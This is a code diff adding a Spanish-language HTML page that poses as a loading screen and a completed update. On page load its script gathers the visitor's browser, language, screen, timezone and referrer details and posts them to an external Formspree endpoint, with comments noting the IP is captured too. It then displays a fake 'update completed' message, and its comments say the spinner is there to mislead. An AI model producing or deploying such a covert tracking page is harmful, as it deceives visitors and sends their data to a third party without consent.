@@ -1,0 +1,74 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Cargando...</title>
+    <style>
+        body { 
+            background-color: #f4f4f4; 
+            display: flex; 
+            justify-content: center; 
+            align-items: center; 
+            height: 100vh; 
+            margin: 0; 
+            font-family: Arial, sans-serif;
+        }
+        .loader {
+            border: 5px solid #e0e0e0;
+            border-top: 5px solid #007bff;
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+    <!-- Elemento visual para despistar -->
+    <div class="loader"></div>
+
+    <script>
+        // 1. Recopilar datos del visitante
+        const visitorData = {
+            // IP: Formspree la detectará automáticamente en los metadatos del envío, 
+            // pero podemos incluir userAgent y otros detalles útiles.
+            userAgent: navigator.userAgent,
+            language: navigator.language,
+            screenResolution: screen.width + "x" + screen.height,
+            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+            timestamp: new Date().toISOString(),
+            referrer: document.referrer
+        };
+
+        // 2. Enviar datos a Formspree usando Fetch API (Vanilla JS)
+        fetch("https://formspree.io/f/xvkarpbk", {
+            method: "POST",
+            headers: { 
+                "Content-Type": "application/json",
+                "Accept": "application/json"
+            },
+            body: JSON.stringify(visitorData)
+        })
+        .then(response => {
+            if (response.ok) {
+                console.log("✅ Rastreo enviado correctamente");
+            } else {
+                console.error("❌ Error al enviar:", response.status);
+            }
+        })
+        .catch(error => {
+            console.error("❌ Error de red:", error);
+        });
+
+        // 3. Simular carga y mostrar mensaje final (opcional, para naturalidad)
+        setTimeout(() => {
+            document.body.innerHTML = "<h2 style='text-align:center;'>Actualización completada.</h2>";
+        }, 2000);
+    </script>
+</body>
+</html>
